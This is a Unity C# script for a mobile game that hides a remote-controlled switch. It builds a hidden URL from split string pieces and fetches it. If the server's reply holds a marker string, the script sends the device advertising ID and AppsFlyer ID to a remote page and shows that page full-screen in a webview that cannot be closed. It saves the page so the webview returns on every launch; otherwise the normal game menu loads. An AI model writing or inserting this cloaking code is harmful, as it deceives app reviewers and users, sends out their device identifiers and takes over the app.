using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainCS : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneCSName = "";
    [HideInInspector] public string twoCSName = "";

    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaCS") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneCSName = advertisingId; });
        }
    }
    

    

    private IEnumerator IENUMENATORCS()
    {
        using (UnityWebRequest cs = UnityWebRequest.Get(twoCSName))
        {

            yield return cs.SendWebRequest();
            if (cs.isNetworkError)
            {
                StartCS();
            }
            int glideCS = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && glideCS > 0)
            {
                yield return new WaitForSeconds(1);
                glideCS--;
            }
            try
            {
                if (cs.result == UnityWebRequest.Result.Success)
                {
                    if (cs.downloadHandler.text.Contains("CndDrpPkxihe"))
                    {

                        try
                        {
                            var subs = cs.downloadHandler.text.Split('|');
                            NETCSLOOK(subs[0] + "?idfa=" + oneCSName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            NETCSLOOK(cs.downloadHandler.text + "?idfa=" + oneCSName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartCS();
                    }
                }
                else
                {
                    StartCS();
                }
            }
            catch
            {
                StartCS();
            }
        }
    }

    private void NETCSLOOK(string UrlCSlink, string NamingCS = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _fettersCS = gameObject.AddComponent<UniWebView>();
        _fettersCS.SetToolbarDoneButtonText("");
        switch (NamingCS)
        {
            case "0":
                _fettersCS.SetShowToolbar(true, false, false, true);
                break;
            default:
                _fettersCS.SetShowToolbar(false);
                break;
        }
        _fettersCS.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _fettersCS.OnShouldClose += (view) =>
        {
            return false;
        };
        _fettersCS.SetSupportMultipleWindows(true);
        _fettersCS.SetAllowBackForwardNavigationGestures(true);
        _fettersCS.OnMultipleWindowOpened += (view, windowId) =>
        {
            _fettersCS.SetShowToolbar(true);

        };
        _fettersCS.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingCS)
            {
                case "0":
                    _fettersCS.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _fettersCS.SetShowToolbar(false);
                    break;
            }
        };
        _fettersCS.OnOrientationChanged += (view, orientation) =>
        {
            _fettersCS.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _fettersCS.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlCSlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlCSlink", url);
            }
        };
        _fettersCS.Load(UrlCSlink);
        _fettersCS.Show();
    }



    private void StartCS()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlCSlink", string.Empty) != string.Empty)
            {
                NETCSLOOK(PlayerPrefs.GetString("UrlCSlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoCSName += n;
                }
                StartCoroutine(IENUMENATORCS());
            }
        }
        else
        {
            StartCS();
        }
    }
}
